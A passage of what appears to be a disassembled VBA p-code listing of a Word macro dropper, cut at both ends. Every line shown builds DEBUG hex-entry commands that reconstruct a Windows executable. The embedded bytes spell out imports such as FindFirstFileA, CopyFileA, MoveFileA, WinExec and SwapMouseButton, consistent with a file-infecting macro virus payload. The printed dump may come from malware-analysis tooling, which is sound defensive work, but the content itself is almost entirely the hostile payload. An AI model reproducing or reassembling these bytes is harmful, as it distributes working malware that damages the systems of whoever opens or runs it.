' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #217:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #218:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #219:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #220:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #221:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #222:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #223:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #224:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #225:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #226:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #227:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #228:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #229:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #230:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f00 3c 30 00 00 00 00 00 00 00 00 00 00 bc 30 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #231:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f10 7c 30 00 00 70 30 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #232:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f20 c9 30 00 00 b0 30 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #233:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f30 00 00 00 00 00 00 00 00 00 00 00 00 d4 30 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #234:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f40 e2 30 00 00 f6 30 00 00 06 31 00 00 18 31 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #235:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f50 2a 31 00 00 36 31 00 00 46 31 00 00 5e 31 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #236:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f60 6a 31 00 00 82 31 00 00 8c 31 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #237:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f70 a2 31 00 00 b4 31 00 00 00 00 00 00 d4 30 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #238:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f80 e2 30 00 00 f6 30 00 00 06 31 00 00 18 31 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #239:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f90 2a 31 00 00 36 31 00 00 46 31 00 00 5e 31 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #240:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fa0 6a 31 00 00 82 31 00 00 8c 31 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #241:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fb0 a2 31 00 00 b4 31 00 00 00 00 00 00 4b 45 52 4e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #242:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fc0 45 4c 33 32 2e 64 6c 6c 00 55 53 45 52 33 32 2e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #243:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fd0 64 6c 6c 00 00 00 45 78 69 74 50 72 6f 63 65 73 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #244:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fe0 73 00 00 00 47 65 74 4d 6f 64 75 6c 65 48 61 6e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #245:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ff0 64 6c 65 41 00 00 00 00 46 69 6e 64 4e 65 78 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #246:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1000 46 69 6c 65 41 00 00 00 47 65 74 43 6f 6d 6d 61 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #247:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1010 6e 64 4c 69 6e 65 41 00 00 00 46 69 6e 64 46 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #248:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1020 72 73 74 46 69 6c 65 41 00 00 00 00 43 6f 70 79 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #249:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1030 46 69 6c 65 41 00 00 00 47 65 74 53 79 73 74 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #250:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1040 6d 54 69 6d 65 00 00 00 47 65 74 57 69 6e 64 6f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #251:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1050 77 73 44 69 72 65 63 74 6f 72 79 41 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #252:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1060 4d 6f 76 65 46 69 6c 65 41 00 00 00 53 65 74 43 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #253:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1070 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 41 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #254:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1080 00 00 00 00 57 69 6e 45 78 65 63 00 00 00 47 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #255:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1090 74 4d 6f 64 75 6c 65 46 69 6c 65 4e 61 6d 65 41 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #256:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10a0 00 00 00 00 53 77 61 70 4d 6f 75 73 65 42 75 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #257:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10b0 74 6f 6e 00 00 00 4d 65 73 73 61 67 65 42 6f 78 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #258:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10c0 41 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #259:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #260:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #261:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #262:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1100 00 10 00 00 54 00 00 00 0d 30 22 30 2c 30 37 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #263:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1110 46 30 56 30 6a 30 71 30 7c 30 85 30 8f 30 94 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #264:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1120 a9 30 ba 30 bf 30 ce 30 e6 30 02 31 0d 31 23 31 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #265:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1130 30 31 44 31 58 31 7a 36 80 36 86 36 8c 36 92 36 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #266:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1140 98 36 9e 36 a4 36 aa 36 b0 36 b6 36 bc 36 c2 36 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #267:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1150 c8 36 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #268:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #269:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #270:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
